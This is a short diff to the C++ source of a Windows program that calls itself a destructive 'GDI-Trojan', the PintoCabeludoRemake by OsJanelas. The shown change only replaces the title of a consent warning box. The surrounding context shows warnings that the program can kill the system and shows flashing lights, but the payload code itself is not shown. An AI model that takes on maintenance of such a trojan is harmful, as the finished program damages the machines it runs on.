@@ -1026,7 +1026,7 @@ static DWORD WINAPI LAST(LPVOID lpParam)
 int main() {
     if (GetFileAttributesW(L"C:\\Windows\\bootcfg.dat") == INVALID_FILE_ATTRIBUTES)
     {
-        if (MessageBoxW(NULL, L"WARNING!!!\n\nYou're about to run a potentially harmful program that can cause your system's death. This program also displays flashing lights and plays loud sounds.\n\nBy running this program, you accept full responsibility for any damages that may occur in your system. The creators (OsJanelas) will not be responsible for anything caused by this virus. By the way, this was created for educational and entertainment purposes.\n\nOriginal download: https://github.com/OsJanelas/GDI-Trojan.Win32.PintoCabeludoRemake\n\nWould you like to proceed with running this program?", L"'Seeking light while fighting our ghosts in the shadows of the purgatory.'", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
+        if (MessageBoxW(NULL, L"WARNING!!!\n\nYou're about to run a potentially harmful program that can cause your system's death. This program also displays flashing lights and plays loud sounds.\n\nBy running this program, you accept full responsibility for any damages that may occur in your system. The creators (OsJanelas) will not be responsible for anything caused by this virus. By the way, this was created for educational and entertainment purposes.\n\nOriginal download: https://github.com/OsJanelas/GDI-Trojan.Win32.PintoCabeludoRemake\n\nWould you like to proceed with running this program?", L"'A hairy chicken, a big chicken, you paint like a paint?'", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
         if (MessageBoxW(NULL, L"LAST WARNING!!!\n\nThis is the LAST warning, as you're already aware of the risks, press 'Yes' to continue. Otherwise, press 'No'. Also be sure you're running in a safe environment, like VMs and test machines.\n\nProceed at your own risk...\n\nAAAAAAA", L"GDI-Trojan.Win32.PintoCabeludoRemake - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
 
     }
@@ -1149,3 +1149,4 @@ int main() {
     return 0;
 
 }
+
